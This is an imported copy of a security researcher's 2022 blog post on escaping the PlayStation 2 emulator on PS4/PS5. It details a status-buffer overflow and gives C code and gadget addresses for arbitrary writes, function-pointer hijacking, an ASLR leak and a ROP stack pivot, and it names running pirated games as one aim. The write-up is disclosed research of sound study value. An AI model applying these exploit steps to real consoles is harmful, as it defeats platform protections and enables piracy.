---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-26_mast1c0re-hacking-the-ps4-ps5-through-the-ps2-emulator-part-1-escape.md
original_filename: 2022-09-26_mast1c0re-hacking-the-ps4-ps5-through-the-ps2-emulator-part-1-escape.md
title: 'mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 1 - Escape'
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: dbb22fc7c8d755f62e8c398f8edcaea2e8bac8eb4b71661ef82d195cfd5aa10a
text_sha256: b6d1afa6a583f266d6e956b5fdb7f118967e48ec715aa564992f6af2f61bf1cb
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 1 - Escape

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-26_mast1c0re-hacking-the-ps4-ps5-through-the-ps2-emulator-part-1-escape.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `dbb22fc7c8d755f62e8c398f8edcaea2e8bac8eb4b71661ef82d195cfd5aa10a`
- Text SHA256: `b6d1afa6a583f266d6e956b5fdb7f118967e48ec715aa564992f6af2f61bf1cb`


## Content

---
title: "mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 1 - Escape"
url: "https://cturt.github.io/mast1c0re.html"
final_url: "https://cturt.github.io/mast1c0re.html"
authors: ["CTurt (@CTurtE)"]
programs: ["PlayStation"]
bugs: ["Memory corruption"]
publication_date: "2022-09-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2170
---

[ Contact ](contact.html) [ About ](about.html) [ Articles ](articles.html) [ Home ](index.html)

# mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 1 - Escape

Initial publication: September 14th, 2022

* * *

In this article I will discuss how I successfully escaped the PS2 emulator developed for the PlayStation 4. See also [Part 2](mast1c0re-2.html), covering the next part of the exploit chain, and PlayStation's response to the research.

For the impatient, a demo video for the first part of this chain is presented later in this article.

_Note that these vulnerabilities were discovered and reported back in September 2021, but I was only able to publish this now._

  

## Intro

It's been a long time since [I last worked on](https://cturt.github.io/dlclose-overflow.html) any modern PlayStation hacking, but with the release of the PS5 and the introduction of PlayStation's bug bounty program, I was motivated to attempt some kind of exploit chain that would work on the PS5.

I settled on attacking the PS2 emulator, which turns out to be a very appealing target for a number of reasons:

  1. Escaping it would grant the ability to run **pirated PS2 games** on the PS4, PS5, and potentially also the PSN cloud gaming service.

This is particularly valuable because access to running just the subset of officially available PS2 games on these platforms is being charged at the **highest tier** of PlayStation's new subscription service.

  2. The PS2 emulator is some of the last remaining **JIT privileged code** on the PS5.

Sony aggressively removed JIT privileged attack surface from the PS5, disabling JIT in both the web browser and [the BluRay player](https://github.com/TheOfficialFloW/Presentations/blob/master/2022-hardwear-io-bd-jb.pdf). Since the PS2 emulator is really a PS4 title that runs due to backwards compatibility, they were unable to make changes to the software, and so its JIT privilege had to be spared.

Having JIT privilege means that _fully_ compromising the emulator, including the compiler co-process, would grant the ability to run fully arbitrary native code (not just ROP) on the PS4/PS5 without the need for a kernel exploit. This would be especially convenient on the PS5 because the newly introduced [hypervisor](https://playstationdev.wiki/ps5devwiki/index.php?title=Hypervisor) enforces that code pages (both userland and kernel) are not readable, and I don't have the patience to try to write a blind kernel exploit again as I did when I [ported BadIRET to the PS4](https://cturt.github.io/ps4-3.html) without a kernel dump.

With arbitrary code execution in a PS4 game process, homebrew software, including JIT optimised emulators, and potentially even some pirated commercial PS4 games could be run under this context.

  3. Under PlayStation's security model it's essentially **unpatchable**.

Once you have access to an exploitable game (digital or physical), it would be extremely difficult for PlayStation to remove your access to it.

The console was designed to enforce required updates for the Operating System to play the latest games, but the Operating System was not designed with any mechanism to enforce the latest patches for games; ie: old versions of games can always be played on the latest version of the Operating System:

  * For physical games, you can simply launch them without first checking for updates.
  * For digital games, you can [downgrade them](https://www.youtube.com/watch?v=wGUQ2Ynx0Uk) by proxying PSN traffic (which is just HTTP, instead of HTTPS for server-side cost saving reasons).

It was designed this way since PlayStation can't be held responsible for the security of third party games (particularly those that statically link to old versions of WebKit). Their security model instead focuses on securing higher privileged layers of the platform (kernel, and hypervisor on PS5), operating under the assumption that games are compromised.

It's my interpretation that the existence of games with special privileges, like the PS2 emulator's JIT, fundamentally violates their own security model because it leaves privileged code with no readily available mechanisms to patch potential future vulnerabilities.

Furthermore, in addition to the gap in their security model that prevents patching existing copies of the games, PlayStation has also decided to not even remove the identified known-exploitable PS2 games for purchase from the store. Because of these two reasons, I'm comfortable referring to this exploit chain as "unpatchable", even if it may not _technically_ be fully accurate.

  

## PS2 Emulator Anatomy

The emulator is divided into 2 separate processes: the main **application** process (`eboot.bin`), and its **compiler** child process (`ps2-emu-compiler.self`).

The kernel assigns each of these process different privileges, implemented by checking the result of the `sceSblACMgrIsJitApplicationProcess` and `sceSblACMgrIsJitCompilerProcess` functions (names taken from back when PS4 kernels still had symbols). The compiler can **write** code, and the application can **execute** code.

The check used to be [implemented incorrectly](https://cturt.github.io/ps4-3.html#code-execution), and the browser application process on PS4 firmware 1.76 could create both writeable mappings, and executable mappings, but nowadays we would need to control both processes in order to be able to produce fully arbitrary code, and so that will be the goal of this chain.

  

## PS2 Code Execution Entry-point

Our exploit chain will begin by exploiting a PS2 game to achieve code execution within the emulator, either through a save game exploit, or through a purely controller-triggered exploit.

  * PS2 save game vulnerabilities are not hard to find; for example, see the GTA decompilations [showing](https://github.com/halpz/re3/blob/9a7fa478578beaba947ea867c15a25e411d641d8/src/save/MemoryCard.cpp#L358) a copy from the memory card into a fixed-size buffer with size supplied by the save; exploiting these issues is relatively simple since the PS2 didn't have any exploit mitigations. With one of these exploits, a PS4 save file containing the crafted PS2 memory card can be encrypted and signed for any PSN-ID by anyone with a hacked PS4 on any firmware (or just a PC if they have the decapped SAMU keys), and then imported to the target PS4/PS5 using the USB save import feature in Settings.

  * A controller-input-triggered exploit would be less practical, except for having the ability to be used without requiring the USB save import feature, which depends on having signed into PSN (since saves are encrypted per-account), and times out on the PS5 after being offline for too long.

I did briefly search for PS2 games available on PS4 which could be exploitable this way, and discovered that Dark Cloud would be (there's [a decades-old known bug](https://www.youtube.com/results?search_query=%22dark+cloud%22+item+glitch+menu+before%3A2008-01-01) whereby moving the cursor and pressing X on the same frame in the items menu allows you to pick up an item from out-of-bounds memory, which results in exploitable behaviour), but sadly it only received a digital PS4 release, not a physical PS4 disc release (so it doesn't help remove the PSN requirement).

For my chain, I settled on [Okage Shadow King](https://store.playstation.com/en-us/product/UP9000-CUSA02199_00-SCUS971290000001), which has a typical stack buffer oveflow if you extend the player/town name.

  

## The Emulator Bug

Given PS2 code execution from any of the 3 identified exploitable PS2 games, I started reverse engineering the emulator itself. The very first thing I looked at was the memory read/write callbacks; you can see on [ps2tek](https://psi-rockin.github.io/ps2tek/#iomaps) that some addresses control various PS2 hardware functionality, and so accessing them requires special code for the emulator to handle those requests.

For example, you can see how the PS2's Linux kernel port [performs CDVD S commands](https://lore.kernel.org/linux-mips/f5e5a0d92314d695c09c091a25217f7b710c55ca.1567326213.git.noring@nocrew.org/) using these IO registers. To pass arguments to an S command, they are written byte-by-byte into the `SCMD_SEND` / `SCMD_STATUS` register (`0x1F402005`), and there is a similar register used for supplying arguments to CDVD N commands (`0x1f402017`).

Let's take a look at how the emulator handles byte writes to those registers. Below are snippets from the decompilation of function at `0x479584` in the eboot of Okage Shadow King update 1.01:
  
  
  case 0x1f402005: // N_STATUS
  currentbufferoffset = (ulong)nstatusindex;
  nstatusindex = nstatusindex + 1;
  (&nstatusbuffer)[currentbufferoffset] = b;
  bVar3 = DAT_014977d5;
  break;
  
  ...
  
  case 0x1f402017: // S_STATUS
  currentbufferoffset = (ulong)sstatusindex;
  sstatusindex = sstatusindex + 1;
  (&sstatusbuffer)[currentbufferoffset] = b;
  bVar3 = DAT_014977d5;
  break;
  

  

This is quite an obvious bug: there are no bounds checks on any of these buffered operations.

In other words, simply writing to either of these registers consecutively more than 16 times will lead to overflowing the status buffers with arbitrary bytes; we'll call this **Primitive 1** , and by submitting invalid commands to reset the index, we can use it repeatedly:
  
  
  void resetSStatusIndex(void) {
  // Submit invalid command!
  *S_CMD = 0;
  
  // Wait for completion (busy flag to be cleared)
  while((*S_STATUS) & 0x80);
  
  // Flush S command result
  while(!((*S_STATUS) & 0x40)) (void)S_IN;
  }
  
  void sStatusBufferOverflow(void *overflow, unsigned int overflowSize) {
  resetSStatusIndex();
  
  // Fill the buffer
  for(int i = 0; i < 0x10; i++) {
  *S_STATUS = 0;
  }
  
  // Begin writing out-of-bounds
  for(int i = 0; i < overflowSize; i++) {
  *S_STATUS = ((unsigned char *)overflow)[i];
  }
  }
  

  

Note that other registers like `0x1f402016` (CDVD S Command), and `0x1f402004` (CDVD N Command), are also vulnerable to buffer overflows, so in total there are at least 4 variant vulnerabilities like this, but since the emulator is quasi-unpatchable, and PlayStation's bounty program stopped accepting PS2 emulator escape reports after the first one, there is no reason to find or analyse other bugs.

  

### Primitive 2 - Consecutive Overwrite to Overwrite at Arbitrary Index

To start exploiting this bug, let's lay out the addresses of the aforementioned variables so we can see what corruption we can cause from the overflows:
  
  
  0x897810 n status buffer (16-bytes)
  0x897820 s status buffer (16-bytes)
  (0x60 bytes of other variables)
  0x897890 n status index (4-bytes)
  (0xc bytes of other variables)
  0x8978A0 s status index (4-bytes)
  

  

By overflowing the S status buffer, we will very quickly begin overwriting the N status index.

Looking back at the handling of writing a byte to the N status register, you'll notice that once we control the N status index, this code path will allow us to write our arbitrary input byte to the N status buffer at an arbitrary 4-byte unsigned index (and then advance the index by 1):
  
  
  case 0x1f402005: // N_STATUS
  currentbufferoffset = (ulong)nstatusindex;
  nstatusindex = nstatusindex + 1;
  (&nstatusbuffer)[currentbufferoffset] = b; // <-- Controlled byte write to controlled 4-byte unsigned index
  bVar3 = DAT_014977d5;
  break;
  

  

We'll call this **Primitive 2**.
  
  
  void resetNStatusIndex(void) {
  // Submit invalid command!
  *N_CMD = 0;
  
  // Wait for completion (busy flag to be cleared)
  while((*N_STATUS) & 0x80);
  }
  
  void setOOBindex(unsigned int index) {
  resetNStatusIndex();
  
  unsigned char overflow[0x60 + sizeof(index)] = {};
  
  // Overwrite N status index
  overflow[0x60 + 0] = index >> 0;
  overflow[0x60 + 1] = index >> 8;
  overflow[0x60 + 2] = index >> 16;
  overflow[0x60 + 3] = index >> 24;
  
  sStatusBufferOverflow(overflow, sizeof(overflow));
  }
  
  void writeToOOBIndex(unsigned char v) {
  // Perform OOB write to N status index and advance index
  *N_STATUS = v;
  }
  
  void writeOOB1(unsigned int index, unsigned char v) {
  setOOBindex(index);
  writeToOOBIndex(v);
  }
  
  // ... writeOOB2, writeOOB4, writeOOB8, writeOOBN ...

  

Since the write is made relative to a statically allocated buffer in the eboot's read-write data region, ASLR doesn't affect our ability to corrupt any other reachable targets in the eboot's mapped sections, but just for demonstration purposes: if we temporarily disable ASLR, we can use it to create a small Proof-Of-Concept that writes to the native PS4 address `0x41414141` from within PS2 code execution context:
  
  
  // Write 0x41 to native PS4 address 0x41414141 (if ASLR is disabled, N status buffer will be at 0x897810)
  writeOOB1(0x41414141 - N_STATUS_BUFFER, 0x41);
  

  

As with the first primitive, we can do this repeatedly, which results in an extremely powerful primitive: the ability to corrupt any bytes in the eboot's read-write data region that come after the status buffer (since the index is `unsigned`) to controlled values, without any significant corruption side effects.

Let's browse the memory after this N status buffer, to see what we could corrupt with this new primitive.

  

### Unused Primitive - Arbitrary Read/Write by Remapping IOP RAM

If we go back to the memory read/write handlers, we'll see that the code handling [virtual memory addresses](https://psi-rockin.github.io/ps2tek/#memorymap) backed by Random-Access-Memory regions are implemented using pointers. For instance, when the PS2 performs a 32-bit write to IOP RAM, the emulator will eventually perform a write at its native `iopram` pointer:
  
  
  *(unsigned int *)(iopram + (ulong)address) = value;
  

  

Since that `iopram` pointer (`0xAF6E38`) happens to be located after the N status buffer, it is reachable with corruption primitive 2.

By overwriting it, we will effectively remap the emulator's internal pointer to IOP RAM (from its normal value of the fixed address `0x9000000000`), so that any read/writes we make from the PS2 to the IOP RAM region will be redirected to our new address.

The below PoC demonstrates using this new primitive to write to a native address which we couldn't reach before with just primitive 2's 32-bit indexing:
  
  
  // Remap IOP from 0x0000009000000000 -> 0x0000004100000000
  writeOOB1(IOP_RAM_POINTER - N_STATUS_BUFFER + 4, 0x41);
  
  // Write 0x61 to 0x4100000000
  volatile unsigned char *iop_ram = (void *)0x1C000000;
  *iop_ram = 0x61;
  

  

Just like that, we've achieved arbitrary native read/write from PS2 code!

In practice, this primitive is not very reliable because the emulator runs multiple threads, which may start to behave unexpectedly if we redirect this pointer, so I didn't end up using it in the final exploit. Let's continue browsing for other corruption targets.

  

### Primitive 3 - Redirected Read-Handler Call

Back again to the memory read/write handlers, we'll see that there are also some jump tables / arrays of function pointers that are called when we access some of the memory mapped IO registers.

For example, if we submit a read to `0x10000000`, the below code will be reached with `rcx == 0`, and it will call the first function pointer in the `ioRegisterReadHandlers` array:
  
  
  0x6E4098: LEA RAX, [ioRegisterReadHandlers]
  ...
  0x6E40B2: CALL qword ptr [RCX + RAX*0x1]
  

  

By using primitive 2, we can corrupt this entire function pointer to an arbitrary 64-bit address.

Since this program was not compiled with [CFI](https://en.wikipedia.org/wiki/Control-flow_integrity) enabled, this will allow us to then trigger a call to our corrupted function pointer by reading from `0x10000000`, and the `eax` register will ultimately be returned as the result back to our PS2 read instruction; we'll call this **Primitive 3** :
  
  
  // Redirecting the emulator's IO read function pointer lets us call an arbitrary address and get back whatever eax holds after it returns
  unsigned int callGadgetAndGetResult(unsigned int gadget) {
  unsigned int ioReadFunctionPointerIndex = IO_REGISTER_READ_HANDLERS - N_STATUS_BUFFER;
  volatile unsigned int *io = (void *)0x10000000;
  
  // Corrupt the function pointer
  writeOOB4(ioReadFunctionPointerIndex, gadget);
  
  // Call the corrupted function pointer, return the result
  return *io;
  }
  

  

We have now achieved arbitrary control flow redirection (with the ability to read the return value)!

  

### Primitive 4 - Partial-Function-Pointer-Overwrite Leak

At this point it's very almost game over; although we can redirect control flow, we don't yet know the address of anything to jump to.

Whilst I had considered that it may be possible to bypass ASLR without any software vulnerability by implementing a spectre-style side channel attack using the [high precision timers](https://psi-rockin.github.io/ps2tek/#eetimers) the PS2 is provided access to, it turned out to be easier to just continue to leverage the primitives I've already established.

I went with the partial-pointer-overwrite technique. This exploits the fact that module base addresses are page aligned, so not _fully_ random. Specifically, the PS4 page size is `0x4000 = 2^14`, so the least significant 14-bits (1.75 bytes) of any code address will always be the same.

Let's take the first IO register read handler pointer; it points to a very small function, with just `0x31` bytes difference between its first and last instructions (`0x615381 - 0x615350`):
  
  
  0000000000615350  add edi, 0xf0000000
  ...
  0000000000615381  ret
  

  

We know for certain that the least-significant byte of this function's address will always be `0x50`. This makes corrupting just this one byte fully deterministic, ie: by changing it to `0x51` we would always point at the offset 1 byte into the function, etc, despite ASLR. Let's add an option to the pre-established `callGadgetAndGetResult` function to allow partial-pointer overwrite:
  
  
  // Redirecting the emulator's IO read function pointer lets us call an arbitrary address and get back whatever eax holds after it returns
  unsigned int callGadgetAndGetResult(unsigned int gadget, unsigned int gadgetSize) {
  unsigned int ioReadFunctionPointerIndex = IO_REGISTER_READ_HANDLERS - N_STATUS_BUFFER;
  volatile unsigned int *io = (void *)0x10000000;
  
  // Corrupt the function pointer
  if(gadgetSize == 4) writeOOB4(ioReadFunctionPointerIndex, gadget);
  
  // Overwrite just the least significant byte, for before we've defeated ASLR
  else if(gadgetSize == 1) writeOOB1(ioReadFunctionPointerIndex, gadget);
  
  // Call the corrupted function pointer
  return *io;
  }
  

  

So where do we redirect the function pointer to? Knowing that whatever is in `eax` will be returned back to the PS2 code that initiated the memory read, we need some code that will leave a pointer in `eax`... If you recall how the function pointer was called, the `rax` register was used to hold the function pointer address, so we don't need to have it do anything, just immediately return!
  
  
  unsigned int getEbootDiff(void) {
  // Corrupt the least significant byte from 0x50 -> 0x81 (0x60 -> 0x91 in Okage), to point to a ret instruction
  // this will make the call return without updating eax (it will still hold the address of the function pointer itself)
  unsigned int ioFunctionPointerAddress = callGadgetAndGetResult(PARTIAL_POINTER_OVERWRITE_RET, 1);
  
  // This is the difference from the address of the function pointer that we see during static analysis in Ghidra
  unsigned int ebootDiff = ioFunctionPointerAddress - IO_REGISTER_READ_HANDLERS;
  
  return ebootDiff;
  }
  

  

With the leaked address, we can derive the address of anything else in any of the eboot binary's mapped sections (since they all coalesce). Another helpful note for us is that since these are the first things mapped into the process their addresses are guaranteed to fit within 32-bits; below is a sample:
  
  
  eboot executable pages - 0x400000
  eboot read-only pages - 0x750000
  eboot read-write pages - 0x768000
  eboot read-write pages - 0x76c000
  

  
  

### Leaking the Stack Pointer

Now that we've defeated ASLR of the eboot, we are no longer limited to executing just gadgets within reach using the partial-pointer-overwrite trick.

Let's try to find a gadget that can leak the address of the stack (which we'll need later to return gracefully after our ROP chain finishes).

I've used [rp++ tool](https://github.com/0vercl0k/rp) to generate ROP gadget lists [since the early PS4 days](https://cturt.github.io/ps4.html#finding-gadgets) (shoutout to [0vercl0k](https://twitter.com/0vercl0k)). In this case, I searched for `esp` and identified this one:
  
  
  0x6BE323: add eax, esp ; ret
  

  

We already know what the initial `eax` value will be at the time of calling the gadget (from the partial-pointer-overwrite leak described above), so we can just subtract it to get `esp`, and then `rsp` is predictably `esp | 0x700000000` (another weakness of the PS4 ASLR implementation):
  
  
  // "Runtime_EE start" stack page base address
  unsigned long getStackBase(unsigned int ebootDiff) {
  #define STACK_DIFF (0x7EECAFAE8 - 0x7EEC90000)
  unsigned int add_eax_esp_ret = 0x6BE323 + ebootDiff;
  
  unsigned long stackLeak = (callGadgetAndGetResult(add_eax_esp_ret, 4) - (IO_REGISTER_READ_HANDLERS + ebootDiff)) | 0x700000000;
  
  return stackLeak - STACK_DIFF;
  }
  

  
  

### Primitive 5 - Redirected Write-Handler Call

Up to this point we've successfully used primitive 3, our control-flow-redirection primitive, to execute single gadgets (such as `add eax, esp`). Our next step will be to execute ROP chains of multiple gadgets, which is normally done by pivoting the stack pointer (redirect `rsp` to somewhere we control the contents).

There are many different potential routes to choose from. I decided to experiment with redirecting write handlers. Whilst the read handlers gave us back the result of the called gadget, a write handler can be called with an arbitrary argument in the `esi` register (the value the PS2 instruction is writing), which may be useful to control. Let's call this **Primitive 5** :
  
  
  // Redirecting the emulator's interrupt register write handler lets us call an arbitrary address with an arbitrary argument in edi register
  void callGadgetWithArgument(unsigned int gadget, unsigned int argument) {
  unsigned int interruptRegisterWriteFunctionPointerIndex = INTERRUPT_WRITE_HANDLERS - N_STATUS_BUFFER;
  volatile unsigned int *interruptRegisters = (void *)0x1F801000;
  
  // Corrupt jump target
  writeOOB4(interruptRegisterWriteFunctionPointerIndex, gadget);
  
  // Jump to the corrupted target
  *interruptRegisters = argument;
  }
  

  
  

### Pivoting the Stack

I couldn't really find any simple gadgets to directly pivot the stack with primitive 5 (like `mov esp, esi; ret`), but I was able to come up with a slightly more complicated set of gadgets:
  
  
  //0x7E677C: push rsi ; add bh, cl ; call qword [rsi+0x3B] ;  (1 found)
  unsigned int push_rsi_call_deref_rsi_plus_3b = 0x7E677C + ebootDiff;
  
  //0x49A2E6: pop rcx ; fld st0, st5 ; clc  ; pop rsp ; ret  ;  (2 found)
  unsigned int pop_rcx_pop_rsp_ret = 0x49A2E6 + ebootDiff;
  
  unsigned int pop_rsp_ret = 0x49A2EA + ebootDiff;
  
  // Let's write initial chain to some free space
  unsigned int initialROP_address = FREE_SPACE + ebootDiff;
  
  setOOBindex(FREE_SPACE - N_STATUS_BUFFER);
  
  writeOOB8_presetIndex(pop_rsp_ret);
  writeOOB8_presetIndex(toNative(ropChain));
  
  setOOBindex(FREE_SPACE - N_STATUS_BUFFER + 0x3b);
  
  writeOOB8_presetIndex(pop_rcx_pop_rsp_ret);
  
  callGadgetWithArgument(push_rsi_call_deref_rsi_plus_3b, initialROP_address);
  

  

Execution will start at the `push_rsi_call_deref_rsi_plus_3b` gadget, which will push `rsi` (the address of our initial ROP chain), and a dummy return address, then jump to the `pop_rcx_pop_rsp_ret` gadget. This second gadget will pop the dummy return address into `rcx` and then pivot the stack to our initial ROP chain!

Since the initial ROP chain has to have a pointer to the second half of the stack pivot gadget at offset `0x3b`, we'll just use it to pivot the stack again to an area we fully control without any constraints (the main ROP chain). Arbitrary ROP achieved!

  

### Summary of Route to ROP

The consolidated plan to achieve ROP is to set up all of the aforementioned primitives, summarised below:

Primitive 1 (initial bug):

  * Writing to CDVD S Status register repeatedly overflows S status buffer,

Primitive 2 (arbitrary index write):

  * Use primitive 1 to corrupt N status index,
  * Writing to CDVD N Status register now triggers arbitrary byte write to an arbitrary index,

Primitive 3 (arbitrary call with result):

  * Use primitive 2 to overwrite an IO read handler function pointer,
  * Reading from that memory-mapped IO register now calls an arbitrary address and gives us the result,

Primitive 4 (defeat eboot ASLR):

  * Use primitive 3 but only partial-pointer-overwrite the address, redirecting it to the function's `ret` instruction,
  * That primitive will now return us an address within the eboot,

Primitive 5 (arbitrary call with arbitrary argument):

  * Use primitive 2 to overwrite an IO write handler function pointer,
  * Writing to that memory-mapped IO register now calls an arbitrary address with controlled `esi` register,

Then to use them like so:

  1. Use primitive 4 to leak an eboot pointer, which we'll use in subsequent steps to locate gadgets within the eboot's executable section,
  2. Use primitive 3 to call a stack pointer disclosure gadget and get the result,
  3. Create the initial ROP chain (just a stack pivot to the main ROP chain); use primitive 2 to write it to some free space within the eboot's data section so that its address will fit within 32-bits,
  4. Construct a main ROP chain, that finishes by restoring the original callee-saved registers including the stack pointer value which we leaked in step 2,
  5. Use primitive 5 to call the stack pivot gadget pair (with `rsi` pointing to the initial ROP chain),

This will result in executing our main ROP chain, and then returning gracefully back to PS2 execution. Note that the first 3 steps are part of the setup process that only needs to be done once; to execute subsequent ROP chains we just need to write them over the last chain, and then execute them by writing to the pre-corrupted memory-mapped-IO handler (steps 4 - 5).

  

## Booting Custom PS2 Games

Now that we've successfully escaped the PS2 emulator, the natural first thing to try doing with it is to boot another game.

There are a few options for retrieving an external game file:

  * Bundling it within the save file initially seems like the obvious choice, but since PS4 save games have a filesize limit (I think it was 1GB, but then raised a bit for Cyberpunk's release), this approach won't work for many PS2 games.

  * You could probably also copy games off USB storage by manually porting over a USB and FAT implementation (since `mount` syscalls are restricted), like I [did](https://github.com/CTurt/PS4-SDK/blob/40c54a2b4668da87011f9b46df3e99572105284b/examples/usb/usbfatfs/source/main.c#L68) with my native GameBoy emulator Proof-of-Concept for the PS4 1.76 WebKit and JIT exploit.

  * I chose to just upload the desired game to the console over the local network on each run. My rudimentary proof-of-concept without any compression and over WiFi takes almost 20 minutes for a 1.3GB game like Klonoa 2, but this could surely be improved.

Once the ISO file is somewhere accessible on the filesystem, it was just a case of locating the emulator's code responsible for opening the disc file (`/app0/images/disc01.iso`) by setting a breakpoint on `sceKernelOpen`, using the exploit to call it (with a traversed path like `./../bla/boot.iso` to bypass some internal check), undoing any left over corruption, and finally having the PS2 code call `LoadExecPS2` to boot an ELF on the newly mounted virtual disc to start the new game.

  

Note that the emulator was configured specifically for the game it was bundled with (in this case Okage Shadow King), and whilst some of the configuration may be tweakable at runtime through the exploit, expect compatibility with other games to be spotty in general, although at least Klonoa 2 seems to work fine as is (an [otherwise $40 dollar game](https://store.playstation.com/en-us/product/UP0700-PPSA04796_00-KLONOA12ENCORE00)).

  

## Part 1 Conclusion

PS2 piracy is a fun implication, especially being able to disclose it despite there being no patch, but my main goal was getting native homebrew applications running.

Regarding that goal, escaping the emulator is just the first half of the chain; we can't yet write arbitrary native code since our application process only has permission to map JIT shared memory as executable, not writeable.

We could technically write "PS4-enhanced" PS2 homebrew applications that could use any native PS4 functionality, and so could behave essentially the same as normal PS4 homebrew (accessing the PS4 controller's touchpad, etc), but I really wanted to achieve fully arbitrary code execution for a more practical homebrew environment. This makes the next step attacking the compiler process: [mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 2 - Arbitrary Code Execution](mast1c0re-2.html).

  

## Thanks

flatz, balika011, theflow0, chicken(s), PlayStation
